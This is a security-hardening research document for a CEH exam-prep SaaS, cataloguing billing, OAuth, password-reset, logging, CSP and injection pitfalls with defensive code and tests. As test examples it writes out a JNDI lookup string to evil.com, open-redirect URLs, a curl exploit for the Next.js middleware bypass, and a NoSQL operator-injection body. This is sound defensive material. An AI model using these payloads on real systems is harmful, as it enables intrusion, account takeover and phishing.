# Pitfalls Research — CEH Prep Hardening Milestone

**Domain:** SaaS with Paddle billing + custom OAuth + tier-gated content, attacked by ethical hacking students
**Researched:** 2026-04-13
**Overall confidence:** HIGH (Paddle docs, Google official docs, CVE databases, OWASP, Next.js advisories)

> **Threat model first principle:** every user of this product is being actively taught how to attack web apps. Assume the full OWASP Top 10 arsenal gets pointed at every endpoint. Defense-in-depth is not optional — the client bundle, the session cookie, the webhook receiver, and the admin route each need to survive standalone even if every other layer is bypassed.

---

## Critical Pitfalls

### Pitfall 1: Paddle webhook signature verification with string equality (`===`)

**What goes wrong:**
Developer implements the HMAC-SHA256 comparison with plain JavaScript `===` or `Buffer.compare()` short-circuit comparison. A determined attacker uses timing differences (across millions of forged requests) to recover the expected signature byte-by-byte, then forges `subscription.created` events to self-upgrade to Pro.

**Why it happens:**
Every Paddle tutorial on the open web shows the HMAC compute step but sometimes skips the comparison step. `crypto.timingSafeEqual` is verbose (requires `Buffer.from(a)`, `Buffer.from(b)`, length-equal check, throws on mismatch length) so developers reach for `===`.

**How to avoid:**
**Do not roll your own.** Use `@paddle/paddle-node-sdk`'s `paddle.webhooks.unmarshal(rawBody, secretKey, signature)` which does timing-safe comparison internally and returns a typed event object. Never parse the body with `express.json()` / Next.js built-in JSON parsing before verification — you MUST use `request.text()` to preserve the exact raw bytes:

```typescript
// app/src/app/api/webhooks/paddle/route.ts
import { Paddle, Environment } from "@paddle/paddle-node-sdk";
import { env } from "@/lib/env";

export const runtime = "nodejs"; // NOT edge — SDK uses node crypto
export const dynamic = "force-dynamic";

const paddle = new Paddle(env.PADDLE_API_KEY, {
  environment: env.PADDLE_ENV === "production" ? Environment.production : Environment.sandbox,
});

export async function POST(req: Request): Promise<Response> {
  const signature = req.headers.get("paddle-signature") ?? "";
  const rawBody = await req.text(); // CRITICAL: raw bytes, not parsed
  if (!signature || !rawBody) return new Response("invalid", { status: 400 });

  let event;
  try {
    event = await paddle.webhooks.unmarshal(rawBody, env.PADDLE_WEBHOOK_SECRET, signature);
  } catch {
    return new Response("signature verification failed", { status: 401 });
  }
  // ... proceed to idempotent handler
}
```

**Detection/test:**
- Unit test: feed the handler a request with a slightly-modified signature byte → must return 401.
- Unit test: feed the handler a request with an extra whitespace character in the body → must return 401.
- Integration test: Paddle sandbox sends real webhook → returns 200.
- Code review: grep for `===` and `Buffer.compare` near signature verification. Reject both.

**Phase to address:** Phase 2 — Billing integration (before any webhook handler ships)

---

### Pitfall 2: Paddle webhook handler not idempotent → double-provisioning, tier desync, race conditions

**What goes wrong:**
Paddle explicitly says "webhooks may be delivered multiple times" and "order of delivery is not guaranteed." Developer writes `if (event.type === "subscription.created") { user.tier = "pro" }` without dedupe. The same event gets replayed during Paddle's retry window (72h), the user's tier flips back and forth, or a late-arriving `subscription.created` overwrites a `subscription.canceled` that already ran, leaving a canceled user with Pro access.

**Why it happens:**
The "simple" path looks simple. Race conditions are invisible in dev where events arrive cleanly. The bug only shows up at scale with real retry traffic.

**How to avoid:**
Two-layer defense:

**Layer 1 — Event deduplication via unique index:**
```typescript
// app/src/lib/db/models/webhook-event.ts
const webhookEventSchema = new Schema({
  eventId:   { type: String, required: true, unique: true }, // Paddle event_id
  eventType: { type: String, required: true },
  occurredAt:{ type: Date,   required: true },
  payload:   { type: Schema.Types.Mixed, required: true },
  processedAt:{ type: Date,  default: null },
});
// unique index on eventId MUST be enforced at Mongo level
```

**Layer 2 — Process in occurred_at order, use findOneAndUpdate with monotonic clock check:**
```typescript
// Only update if the incoming event is NEWER than what we have
await SubscriptionModel.findOneAndUpdate(
  {
    userId: { $eq: userId },
    $or: [
      { lastEventAt: { $lt: event.occurredAt } },
      { lastEventAt: null },
    ],
  },
  { $set: { status: event.data.status, lastEventAt: event.occurredAt } },
  { upsert: true }
);
```

**Handler shape:**
```typescript
// 1. Try to insert event-id record. If duplicate key, return 200 (already processed)
try {
  await WebhookEventModel.create({ eventId: event.eventId, ... });
} catch (e) {
  if (isDuplicateKeyError(e)) return new Response("ok", { status: 200 });
  throw e;
}
// 2. Process based on eventType, with monotonic clock guard
// 3. Mark processedAt
// 4. Return 200 within 5s (Paddle retries if slow)
```

**Detection/test:**
- Unit test: call the handler twice with identical event body → second call must be a no-op (DB unchanged).
- Unit test: call the handler with `subscription.updated { status: canceled, occurredAt: T+1 }` then `subscription.updated { status: active, occurredAt: T }` → user stays canceled.
- Integration test: use Paddle's webhook simulator to send the same event twice in 5 seconds.

**Phase to address:** Phase 2 — Billing integration (in the same PR that ships the webhook handler; never ship the handler without dedupe)

---

### Pitfall 3: Tier desync — upgrading a user before the webhook arrives ("optimistic unlock")

**What goes wrong:**
User completes Paddle checkout → the client-side `success` callback fires → developer immediately calls a server action that sets `user.tier = "pro"`. The webhook arrives 30 seconds later and (depending on implementation) either: (a) does nothing because it sees tier already "pro" and logs "no-op," or (b) the user closes the tab before webhook arrives and the optimistic update never happened, leaving them at "free" after paying.

Worse: an attacker replays the client-side `success` event 100 times without ever actually paying.

**Why it happens:**
The client-side `eventCallback: "checkout.completed"` is tempting — it happens instantly. Developers forget that the client event is **not authenticated**. Anyone can fake it from devtools.

**How to avoid:**
**The webhook is the only source of truth for subscription state.** Client callbacks can only trigger UX (spinner, redirect), never state mutation.

```typescript
// CORRECT: client-side success just routes to a "processing" page
Paddle.Initialize({
  token: env.NEXT_PUBLIC_PADDLE_CLIENT_TOKEN,
  eventCallback: (event) => {
    if (event.name === "checkout.completed") {
      // UX only — do NOT call a server action that mutates tier
      router.push("/welcome-pro?pending=true");
    }
  },
});

// The /welcome-pro page polls a server action that reads Subscription model (populated by webhook)
// Show "processing your payment..." for up to 30s, then redirect to dashboard
```

Never expose a server action like `confirmPurchase(transactionId)` that the client can call. If you must acknowledge the client event, use it purely to display a spinner.

**Detection/test:**
- Manual test: open devtools, call `Paddle.Checkout.open()` with a fake transaction ID → user tier must stay "free."
- E2E test: complete a sandbox checkout → wait for webhook → verify tier flips via DB read only.
- Code review: grep for any server action that takes a transaction ID or subscription ID from the client. Any such action is suspect.

**Phase to address:** Phase 2 — Billing integration

---

### Pitfall 4: Google OAuth state parameter stored client-side or re-used

**What goes wrong:**
Developer generates a `state` token, embeds it in the Google authorization URL, and stores it… in `localStorage` (or worse, a plain cookie without HttpOnly). An attacker running JS on a compromised subdomain reads the state, initiates their own OAuth flow, sends the victim a link with the stolen state, and when the victim authenticates, the session is bound to the attacker's Google account. Classic session fixation.

Alternatively: state is stored in an HttpOnly cookie but re-used across multiple concurrent login attempts, so a race creates ambiguity about which state belongs to which flow.

**Why it happens:**
`localStorage` is the default lazy choice. Rotation/single-use is extra work. Many tutorials skip the state validation entirely ("it's just CSRF protection, who cares").

**How to avoid:**
- Generate state with `crypto.randomBytes(32).toString("base64url")` — 256 bits of entropy.
- Store in an **HttpOnly, Secure, SameSite=Lax, Path=/auth/google, short-lived (10 min)** cookie — Lax (not Strict) because the callback is a top-level navigation from google.com.
- On callback: read the cookie, compare with `state` query param using `crypto.timingSafeEqual`, **delete the cookie immediately** (single-use), then proceed with code exchange.
- If state missing, mismatched, or cookie expired → audit-log the event and return a generic error.

```typescript
// app/src/lib/auth/oauth-state.ts
import { randomBytes, timingSafeEqual } from "node:crypto";
import { cookies } from "next/headers";

const COOKIE_NAME = "__Host-oauth-state";

export const mintState = async (): Promise<string> => {
  const state = randomBytes(32).toString("base64url");
  const jar = await cookies();
  jar.set(COOKIE_NAME, state, {
    httpOnly: true,
    secure: true,
    sameSite: "lax",
    path: "/",
    maxAge: 600, // 10 min
  });
  return state;
};

export const consumeState = async (received: string): Promise<boolean> => {
  const jar = await cookies();
  const stored = jar.get(COOKIE_NAME)?.value;
  jar.delete(COOKIE_NAME); // single-use, always delete
  if (!stored || stored.length !== received.length) return false;
  return timingSafeEqual(Buffer.from(stored), Buffer.from(received));
};
```

**Detection/test:**
- Unit test: `consumeState()` must delete the cookie even on mismatch.
- Unit test: two simultaneous mint → consume flows with different state values both succeed only for their own state.
- E2E test: start OAuth flow, intercept callback, replay callback with old state → must fail.

**Phase to address:** Phase 1 — Identity (OAuth implementation PR)

---

### Pitfall 5: Google OAuth callback trusts `id_token` without verifying signature, aud, iss, exp, nonce

**What goes wrong:**
Developer receives the authorization code, exchanges it for tokens, gets back an `id_token` (a JWT), and decodes it with `jwt.decode()` (no verification!) to pull out the email. Attacker forges an id_token claiming to be `victim@gmail.com` and gets logged in as the victim.

Or: developer uses `verifyIdToken` but forgets to pass `audience`, so an id_token minted for a completely different Google OAuth client (a malicious app) is accepted.

Or: developer doesn't check `email_verified` and an attacker with an unverified Google account claims `ceo@important-company.com`.

**Why it happens:**
`jwt.decode` is one function call. `verifyIdToken` requires importing the lib, passing the right audience, awaiting… friction breeds shortcuts.

**How to avoid:**
Use `google-auth-library`'s official `verifyIdToken` with all required fields:

```typescript
import { OAuth2Client } from "google-auth-library";
import { env } from "@/lib/env";

const client = new OAuth2Client(env.GOOGLE_OAUTH_CLIENT_ID);

export const verifyGoogleIdToken = async (idToken: string): Promise<Result<GoogleIdentity, OAuthError>> => {
  try {
    const ticket = await client.verifyIdToken({
      idToken,
      audience: env.GOOGLE_OAUTH_CLIENT_ID, // MUST match your client ID
    });
    const payload = ticket.getPayload();
    if (!payload) return err("invalid_token");
    if (payload.iss !== "https://accounts.google.com" && payload.iss !== "accounts.google.com") {
      return err("invalid_issuer");
    }
    if (!payload.email) return err("no_email");
    if (payload.email_verified !== true) return err("email_not_verified"); // CRITICAL
    if (!payload.sub) return err("no_subject");
    // nonce check here if you passed one in the authorize step
    return ok({ googleId: payload.sub, email: payload.email.toLowerCase(), name: payload.name ?? "" });
  } catch {
    return err("verification_failed");
  }
};
```

**Critical rules:**
- `audience` MUST be your OAuth client ID — without it, tokens from other Google OAuth clients pass signature check but are not for you.
- `iss` MUST be `accounts.google.com` or `https://accounts.google.com` (Google uses both).
- `email_verified` MUST be `true` — otherwise an attacker can claim any Gmail address at signup.
- `sub` (Google's stable user ID) is the account-linking key, **not** email. Emails can change or be re-assigned by Google Workspace admins.

**Detection/test:**
- Unit test: feed a JWT with modified payload (unsigned or bad signature) → rejects.
- Unit test: feed a JWT with `aud` set to a different client ID → rejects.
- Unit test: feed a JWT with `email_verified: false` → rejects.
- Pen test: try to replay someone else's captured id_token against your callback.

**Phase to address:** Phase 1 — Identity (OAuth implementation PR)

---

### Pitfall 6: Google OAuth account linking via email (without verification) enables account takeover

**What goes wrong:**
An existing password account has email `victim@gmail.com`. Attacker signs in with Google using `victim@gmail.com` (Google says it's verified). Code does:
```typescript
const existing = await UserModel.findOne({ email: { $eq: email } });
if (existing) { existing.googleId = googleId; await existing.save(); }
```
Attacker is now logged in as the victim and can change the password.

**Why it happens:**
"Linking" is the intuitive UX: same email → same account. It feels right but it's a confused-deputy attack.

**How to avoid:**
Never auto-link. Either:
1. **Strict separation (safest for v1):** if an email has a password account, Google sign-in for that email returns "please log in with your password first, then link Google from settings."
2. **Interactive linking:** on Google callback, if email matches an existing password account, do NOT create a session. Instead, redirect to a page that asks "We found an account for victim@gmail.com. Enter its password to link Google." The user must prove they own the password account.

Store `googleId` as a separate field with a unique index. Match on `googleId` first, then `email` only for linking flows.

```typescript
// Resolution order in callback handler:
const byGoogleId = await UserModel.findOne({ googleId: { $eq: googleSub } });
if (byGoogleId) return createSession(byGoogleId); // happy path

const byEmail = await UserModel.findOne({ email: { $eq: email } });
if (byEmail) {
  // Do NOT link. Do NOT create session. Redirect to linking flow.
  return redirect(`/auth/link?google_token=${shortLivedSignedToken}`);
}

// Brand new user → create account with googleId only (no passwordHash)
const user = await UserModel.create({ email, googleId: googleSub, emailVerified: true });
return createSession(user);
```

**Detection/test:**
- Unit test: existing password user + Google sign-in with matching email → no session created, redirects to link flow.
- Pen test: create password account, then use another Google test account with the same email → try to log in as the password user.

**Phase to address:** Phase 1 — Identity (OAuth implementation PR)

---

### Pitfall 7: OAuth callback open-redirect via `returnTo` / `next` parameter

**What goes wrong:**
To support "click this link → login → come back here," developer adds `?returnTo=/some/path`. On callback, code does `redirect(returnTo)`. Attacker crafts `?returnTo=https://evil.com/phish` and the victim, after successfully authenticating with Google, is redirected to the attacker's phishing page that looks identical to the CEH dashboard and asks for their password again.

Even `?returnTo=//evil.com/phish` (protocol-relative) and `?returnTo=/\\/evil.com` (browser URL parser quirks) slip past naive `startsWith("/")` checks.

**Why it happens:**
The "startsWith('/')" check looks sufficient. Protocol-relative URLs (`//foo`) are a well-known bypass that developers forget.

**How to avoid:**
Use `URL` parsing with a strict allowlist of pathnames, never trust the raw string:

```typescript
const SAFE_PATHS = new Set(["/dashboard", "/course", "/exam", "/pricing"]);

export const safeReturnTo = (input: string | null): string => {
  if (!input) return "/dashboard";
  try {
    // Parse relative to a fake base to catch protocol-relative and absolute URLs
    const url = new URL(input, "https://ceh-prep.local");
    if (url.origin !== "https://ceh-prep.local") return "/dashboard"; // external!
    if (url.pathname.includes("..")) return "/dashboard";
    // Match against known safe prefixes
    for (const safe of SAFE_PATHS) {
      if (url.pathname === safe || url.pathname.startsWith(safe + "/")) {
        return url.pathname + url.search;
      }
    }
    return "/dashboard";
  } catch {
    return "/dashboard";
  }
};
```

Additionally, **never store the `returnTo` in the URL** — store it in the OAuth state cookie alongside the state nonce, so the attacker can't tamper with it mid-flow.

**Detection/test:**
- Unit test: `safeReturnTo("https://evil.com")` → `/dashboard`
- Unit test: `safeReturnTo("//evil.com/foo")` → `/dashboard`
- Unit test: `safeReturnTo("/\\/evil.com")` → `/dashboard`
- Unit test: `safeReturnTo("/dashboard")` → `/dashboard`
- Unit test: `safeReturnTo("/course/5")` → `/course/5`
- Unit test: `safeReturnTo("/course/../../etc/passwd")` → `/dashboard`

**Phase to address:** Phase 1 — Identity (OAuth implementation PR)

---

### Pitfall 8: Password reset endpoint leaks email existence (user enumeration)

**What goes wrong:**
`POST /api/auth/reset` returns `{ error: "no_such_email" }` when email is unknown, or takes 200ms for existing emails and 20ms for unknown ones. Attacker scripts against 10M emails to build a registered-user list for targeted phishing.

Recent CVEs showing this is still actively exploited: **CVE-2024-47057**, **CVE-2026-26185 (Directus)**.

**Why it happens:**
Helpful error messages are a default. Timing consistency requires discipline. Most frameworks don't enforce it.

**How to avoid:**
Three rules:
1. **Always return the same response.** Regardless of whether the email exists: `{ ok: true, message: "If an account exists, a reset link was sent." }`. Status 200.
2. **Always do equivalent work.** Even if the user doesn't exist, do a fake Argon2 hash (CPU-intensive) and a fake email send (async, but wait for completion with a timeout) so the timing is the same.
3. **Rate limit aggressively.** 3 requests per email per hour, 20 per IP per hour. In-memory LRU is insufficient in production (see Pitfall 17); use Redis.

```typescript
export const requestPasswordReset = async (_prev: ActionState, formData: FormData): Promise<ActionState> => {
  const parsed = EmailSchema.safeParse({ email: formData.get("email") });
  if (!parsed.success) return { error: "invalid_input" };
  const { email } = parsed.data;

  // Rate limit by email (hashed to prevent enumeration via rate limit itself)
  const emailHashForRateLimit = hashForRateLimit(email);
  const rl = await rateLimit("pw-reset", emailHashForRateLimit, 3, 3600_000);
  if (!rl.ok) return { ok: true }; // LIE: say success, but silently drop

  const user = await UserModel.findOne({ email: { $eq: email } });

  // Always do equivalent CPU work
  const token = randomBytes(32).toString("base64url");
  const tokenHash = sha256(token);

  if (user) {
    user.resetTokenHash = tokenHash;
    user.resetTokenExpiresAt = new Date(Date.now() + 60 * 60 * 1000); // 1h
    await user.save();
    await sendResetEmail(email, token); // don't await? await for timing consistency
  } else {
    // Fake work to equalize timing
    await sha256(DUMMY_HASH);
    await fakeDelay(60 + Math.random() * 20); // match real send latency
  }

  return { ok: true }; // always same shape, always 200
};
```

**Detection/test:**
- Timing test: measure `requestPasswordReset` with existing vs. non-existing email across 1000 samples. The difference must be under 50ms with overlapping distributions. Automate this in CI.
- Response test: body MUST be identical for both cases.

**Phase to address:** Phase 1 — Identity (password reset PR)

---

### Pitfall 9: Password reset token not hashed at rest, or reusable, or too long-lived

**What goes wrong:**
Developer stores the raw reset token in `user.resetToken`. MongoDB backup gets compromised → every pending reset token in the backup is usable. Or: developer lets the token work multiple times so an email forwarded to a shared mailbox stays usable. Or: token expires in 24 hours, which means a stolen inbox 20 hours old still yields account takeover.

**Why it happens:**
Hashing tokens feels like paranoia. Short TTLs "annoy users." Single-use requires extra logic.

**How to avoid:**
- **Token generation:** `crypto.randomBytes(32).toString("base64url")` → 256 bits of entropy, 43 chars. Not `Math.random()`, not UUID v4 (only 122 bits), not `Date.now()`-based.
- **Storage:** store SHA-256 of the token, never the raw value. Compare incoming token by hashing and using `crypto.timingSafeEqual`.
- **Expiry:** 1 hour maximum. OWASP says "typically within a few hours"; for a product attacked by pentesters, go 1h.
- **Single-use:** upon successful reset, set `resetTokenHash = null` and `resetTokenExpiresAt = null` in the same atomic update.
- **Invalidate on use:** when a user's password is reset, also invalidate all active sessions for that user.
- **Track token reuse attempts:** if a token is presented AFTER being consumed, log `security.token_reuse_attempt` as an audit event.

```typescript
// user.ts model — note the `select: false` so they never leak via default toJSON
resetTokenHash:      { type: String, default: null, select: false },
resetTokenExpiresAt: { type: Date,   default: null, select: false },
```

```typescript
// consume the token
const tokenHash = sha256(formToken);
const user = await UserModel.findOne({
  resetTokenHash: { $eq: tokenHash },
  resetTokenExpiresAt: { $gt: new Date() },
}).select("+resetTokenHash +resetTokenExpiresAt");

if (!user) return { error: "invalid_or_expired_token" };

user.passwordHash = await hashPassword(newPassword);
user.resetTokenHash = null;
user.resetTokenExpiresAt = null;
await user.save();
// ALSO: rotate session cookie, invalidate all active sessions (bump user.sessionEpoch)
```

**Detection/test:**
- Unit test: use a token → try to reuse → must fail.
- Unit test: present an expired token → must fail.
- Unit test: token stored in DB differs from token sent in email (raw vs. hashed).

**Phase to address:** Phase 1 — Identity (password reset PR)

---

### Pitfall 10: Email verification token confusion — attacker verifies their email as someone else's

**What goes wrong:**
Attacker signs up with email `target@victim.com` (which they don't own). System creates an unverified account and sends a verification link to the real owner. The real owner never clicks, but weeks later tries to sign up with their own email — "account already exists" blocks them. Meanwhile the attacker has been using the account (if verification isn't enforced at login).

Alternatively: attacker requests email change to `target@victim.com`, the system sends a verification link, the attacker somehow gets the token (leaked via Referer header, or logged server-side), and claims the victim's email.

**Why it happens:**
Email verification is treated as a "nice to have" that doesn't block features. Reusing tokens across flows (signup verification, email change verification) causes logic confusion.

**How to avoid:**
- **Gate all sensitive actions on `emailVerified: true`.** Unverified users cannot: change password, pay for Pro, change email, access the API.
- **Token contains a `purpose` field** baked into the hash: `sha256(purpose + ":" + token)`. A signup-verification token cannot be replayed as an email-change confirmation.
- **Email change flow** sends verification to the NEW email, AND a notification (no action link, just FYI) to the OLD email that says "your email is being changed; if this wasn't you, click here to cancel."
- **Expire any other pending email-change when one is consumed.**
- **Rate-limit email verification resend** to 3 per hour per account.
- **Collision handling:** at signup, if an unverified account exists for the same email that's older than 24h, it can be overwritten (garbage-collected). Otherwise reject with a timing-consistent generic message.

**Detection/test:**
- Try to sign up with a random email, never verify, wait 24h → can a different user claim that email? (Yes, they should.)
- Try to use a signup-verification token as an email-change token → must fail.

**Phase to address:** Phase 1 — Identity (email verification PR)

---

### Pitfall 11: Tier gate checked only at one layer (page OR action, not both)

**What goes wrong:**
The current CEH Prep codebase already has this bug documented in CONCERNS.md: `saveAnswer` checks `user.tier === "free"` but `course/[day]/page.tsx` does not. Free users can read Pro content even if they can't save progress.

The inverse mistake is equally bad: developer adds a page-level gate but forgets to gate the server action that returns lesson JSON, and the mobile/API client pulls Pro content directly.

**Why it happens:**
"The UI hides it, that's enough." Developers don't think like attackers who know every URL is an API.

**How to avoid:**
**Every protected resource is gated at three layers:**
1. **Layout/page** (SSR): read `session.userId`, look up current tier and subscription status, redirect to `/pricing` if locked. This is what the browser sees.
2. **Server action / API route**: same check, before returning any data. This is what a curl or automated script sees.
3. **Data layer**: `tierGate(userId, day)` helper that is the ONLY way to fetch lesson content. Any call path must go through it.

Implement as a Result-returning function:
```typescript
// app/src/lib/auth/tier-gate.ts
export const assertCanAccessDay = async (
  userId: string,
  day: number,
): Promise<Result<void, "locked" | "not_found">> => {
  if (day < 1 || day > 14) return err("not_found");
  if (day <= 3) return ok(undefined); // free tier
  const user = await UserModel.findById({ _id: { $eq: userId } }).select("tier");
  if (!user) return err("locked");
  // Check subscription too — tier field alone is not enough (see Pitfall 3)
  const sub = await SubscriptionModel.findOne({ userId: { $eq: userId }, status: { $eq: "active" } });
  if (!sub) return err("locked");
  return ok(undefined);
};
```

Then call it EVERYWHERE: layout, page, server action, API route, DAL. If there are 4 entry points, it gets called 4 times. No shortcuts.

**Detection/test:**
- E2E: free user navigates to `/course/5` → redirected to `/pricing`.
- E2E: free user calls `saveAnswer` action with day=5 → returns `{ error: "locked" }`.
- E2E: free user calls internal API route that returns lesson JSON with day=5 → 403.
- Code review: grep for `DaysContent` imports. Every caller must first call `assertCanAccessDay`.

**Phase to address:** Phase 2 — Billing integration (tier gate is part of billing story, not separate)

---

### Pitfall 12: Audit log admin view IDOR — admin route accessible via URL by non-admins

**What goes wrong:**
`/admin/audit` renders audit events and the layout does `if (session.role !== "admin") redirect("/dashboard")`. Meanwhile, the API route `/api/admin/audit` (or the server action the page calls) does NOT check admin role — it only checks "is logged in." A regular user hits the API directly and exfiltrates every audit event in the DB.

For a pentester product, this IS the trophy.

**Why it happens:**
Page-level guards give false confidence. The server action is "internal" so devs forget it's a public endpoint.

**How to avoid:**
**Role check at every entry point, not just the layout.** Pattern:

```typescript
// app/src/lib/auth/require.ts
export const requireAdmin = async (): Promise<Result<AdminSession, "forbidden">> => {
  const session = await getSession();
  if (!session?.userId) return err("forbidden");
  const user = await UserModel.findById({ _id: { $eq: session.userId } }).select("role");
  if (user?.role !== "admin") {
    // Audit attempted privilege escalation
    await audit({ actor: session.userId, event: "admin.access_denied", outcome: "deny" });
    return err("forbidden");
  }
  return ok({ userId: session.userId, role: "admin" });
};
```

Call `requireAdmin()` as the FIRST line of every admin route, every admin server action, every admin API handler.

**Additional defenses for audit admin specifically:**
- **Paginate.** Never return more than 100 events per request. Prevents exfil.
- **No export to CSV unless role is `admin` AND `mfaVerifiedAt` is within 5 minutes.** Re-auth for destructive/sensitive ops.
- **Audit the audit view.** Every admin access to `/admin/audit` itself writes an audit event (`admin.audit.view`). You need tamper-evident "who watched the watchmen."
- **Mask PII.** Never render raw email addresses or IPs in the audit UI without admin confirming they want to see them. Show `j****@gmail.com` by default, reveal on click (also audited).

**Detection/test:**
- Pen test: regular user hits every admin API endpoint with curl → all 403.
- Pen test: regular user modifies session cookie role claim → server recomputes from DB, still 403.
- Pen test: try to enumerate audit events via the API without admin role → 403.

**Phase to address:** Phase 3 — Production hardening (audit admin view PR)

---

### Pitfall 13: Log injection via unescaped user input → log poisoning, log parsing errors, SIEM evasion

**What goes wrong:**
User signs up with display name `foo\n[INFO] User admin logged in from 10.0.0.1\n`. Pino logs it. Someone watching the log tail thinks an admin logged in. Or worse: the name contains terminal escape codes that hijack the log-viewing developer's terminal.

More subtle: user puts `${jndi:ldap://evil.com}` in the display name and if ANY downstream log processor runs a vulnerable log4j version (remember Log4Shell), RCE in the logging pipeline.

**Why it happens:**
Developers sanitize inputs going INTO the DB but not into logs. Logs feel like a dev-only artifact and get overlooked.

**How to avoid:**
- **Always log via pino's structured format**, never via `console.log` or template literals. Pino's JSON serialization escapes newlines, quotes, and control chars automatically.
- **Never log the raw request body or raw headers.** Use a request serializer (`req.raw.url`, `req.raw.method`, `req.headers['user-agent']`) that extracts specific fields.
- **Configure pino with redaction** for known sensitive fields (`password`, `passwordHash`, `authorization`, `cookie`, `resetToken`, `*.email`).
- **Strip control characters from user-generated strings** before logging them, even via pino: `str.replace(/[\x00-\x1F\x7F]/g, "")`.
- **Cap string length** in logs: truncate anything over 500 chars.

```typescript
// app/src/lib/logger.ts
import pino from "pino";
export const log = pino({
  redact: {
    paths: [
      "password",
      "passwordHash",
      "resetToken",
      "resetTokenHash",
      "body.password",
      "*.authorization",
      "*.cookie",
    ],
    remove: true, // completely strip, don't replace with [REDACTED]
  },
  serializers: {
    req: (req) => ({
      method: req.method,
      url: req.url?.split("?")[0], // strip query string (may contain tokens)
      userAgent: (req.headers?.["user-agent"] ?? "").slice(0, 200),
    }),
    err: pino.stdSerializers.err,
  },
  formatters: {
    level: (label) => ({ level: label }),
  },
});

// Helper to sanitize user strings before including in log context
export const logSafe = (s: string): string =>
  s.replace(/[\x00-\x1F\x7F]/g, "").slice(0, 500);
```

**Detection/test:**
- Unit test: log a user with display name `foo\n[INFO] evil` → inspect output, must be one line, newline escaped as `\\n`.
- Unit test: log an object containing `password` field → field must be removed.
- Manual test: sign up with terminal escape sequence `\x1b[31mRED`, tail logs, confirm no color injection.

**Phase to address:** Phase 3 — Production hardening (pino adoption PR)

---

### Pitfall 14: Next.js middleware auth bypass via `x-middleware-subrequest` header (CVE-2025-29927)

**What goes wrong:**
**CVE-2025-29927** (CVSS 9.1). Before Next.js 14.2.25 / 15.2.3, any request with an `x-middleware-subrequest` header whose value is a colon-separated chain of middleware names skips middleware execution entirely. If middleware is your auth layer, attackers set the header and walk in.

CEH Prep is on Next 15. If it's on a version below 15.2.3, this is an active unpatched vuln.

**Why it happens:**
Used to be the "standard Next.js auth pattern" — everyone put auth in middleware. Then the CVE hit.

**How to avoid:**
Two mandatory defenses (both, not either/or):

1. **Upgrade Next.js to >= 15.2.3** (or 14.2.25 if on 14). Lock the minimum in `package.json`: `"next": "^15.2.3"`.
2. **Never put auth in middleware.** CEH Prep already follows this rule (see PROJECT.md: "Middleware = headers only, auth re-verified at every data access"). Middleware should only set security headers. Auth is re-verified in every layout, every server action, every API route, every DAL call.

Additionally: at the edge, strip the dangerous header defensively:
```typescript
// middleware.ts (or an edge function in front)
export function middleware(req: NextRequest) {
  const headers = new Headers(req.headers);
  headers.delete("x-middleware-subrequest");
  // ... set CSP, HSTS, etc
  return NextResponse.next({ request: { headers } });
}
```

**Detection/test:**
- Pen test: `curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" https://ceh-prep.app/dashboard` → must return 401/redirect, not render dashboard.
- CI: fail build if `next` package version is below 15.2.3.
- Code review: `grep -r "getSession\|requireAuth" app/src/middleware*` — must return nothing. Auth is NOT in middleware.

**Phase to address:** Phase 0 (prerequisite — before any of the new code ships) AND Phase 3 (production hardening verification)

---

### Pitfall 15: Nonce-based CSP breaks Paddle checkout overlay and Google Sign-In

**What goes wrong:**
Developer drops `'unsafe-inline'` from `script-src` and adds `'nonce-{value}'`. Paddle's overlay checkout fails to open because `cdn.paddle.com/paddle/v2/paddle.js` is blocked (wasn't in `script-src`), the iframe it spawns can't render (wasn't in `frame-src`), and payments can't complete. Also, Google's `accounts.google.com/gsi/client` scripts and the callback iframe break.

Developer panics, reverts to `'unsafe-inline'`, ships "production CSP" that provides zero XSS protection.

**Why it happens:**
No one tests CSP against all third-party integrations. The initial CSP is written from memory without enumerating every script source.

**How to avoid:**
Build the CSP incrementally in `Report-Only` mode first, collect violation reports, then enforce.

**Production CSP for CEH Prep (with Paddle + Google OAuth):**
```typescript
// app/src/lib/security/csp.ts
export const buildCsp = (nonce: string): string => [
  `default-src 'self'`,
  // Scripts: own + Paddle + Google Identity Services
  `script-src 'self' 'nonce-${nonce}' 'strict-dynamic' https://cdn.paddle.com https://accounts.google.com`,
  // Styles: allow inline for Next.js hydration (no clean alternative)
  `style-src 'self' 'unsafe-inline' https://accounts.google.com`,
  // Fonts: Fontshare + Google Fonts (taste-skill stack)
  `font-src 'self' data: https://api.fontshare.com https://fonts.gstatic.com`,
  // Images: own + data URIs (for OG, favicons) + Google profile pics
  `img-src 'self' data: https://lh3.googleusercontent.com`,
  // Iframes: Paddle checkout + Google OAuth iframe
  `frame-src https://checkout.paddle.com https://buy.paddle.com https://accounts.google.com`,
  // Connect: Paddle API + Google token endpoint
  `connect-src 'self' https://api.paddle.com https://sandbox-api.paddle.com https://accounts.google.com https://oauth2.googleapis.com`,
  // Block everything else
  `object-src 'none'`,
  `base-uri 'self'`,
  `form-action 'self' https://accounts.google.com`,
  `frame-ancestors 'none'`,
  `upgrade-insecure-requests`,
].join("; ");
```

Then, in middleware, generate a nonce per request:
```typescript
import { randomBytes } from "node:crypto";
const nonce = randomBytes(16).toString("base64");
const csp = buildCsp(nonce);
response.headers.set("Content-Security-Policy", csp);
// Pass nonce to the app via a custom header read by layout
response.headers.set("x-nonce", nonce);
```

In `RootLayout`, read the nonce via `headers()` and pass it to `<Script nonce={nonce}>` tags.

**Two gotchas:**
1. Paddle's iframe URL may be `buy.paddle.com` OR `checkout.paddle.com` depending on whether you use overlay or inline — include both.
2. `'strict-dynamic'` means any script loaded by a nonced script is automatically trusted. This is how Paddle's dynamically injected scripts work.
3. `style-src 'unsafe-inline'` is still necessary because Next.js injects hydration styles inline. There's no clean workaround for styles in Next.js 15 at time of writing. Accept this tradeoff — XSS via style-src is much rarer than via script-src.

**Detection/test:**
- Manual test: open Paddle overlay checkout in production build → network tab shows no CSP violations, iframe renders, payment completes.
- Manual test: click "Sign in with Google" → iframe opens, OAuth completes.
- Unit test: CSP string generator returns a valid string with required directives.
- `Report-Only` phase: ship with `Content-Security-Policy-Report-Only` first, collect violations for 48h, then flip to enforcing.

**Phase to address:** Phase 3 — Production hardening (CSP PR, after billing and auth are working so integration points are known)

---

### Pitfall 16: NoSQL operator injection via missing `$eq` wrap on new queries (CVE-2025-23061 class)

**What goes wrong:**
Existing code in CEH Prep already wraps user input in `$eq` (see CONVENTIONS.md). Every new query written for billing/auth/admin MUST follow the same pattern. One missed wrap = attacker sends `{ "email": { "$ne": null } }` and `findOne` returns an arbitrary user.

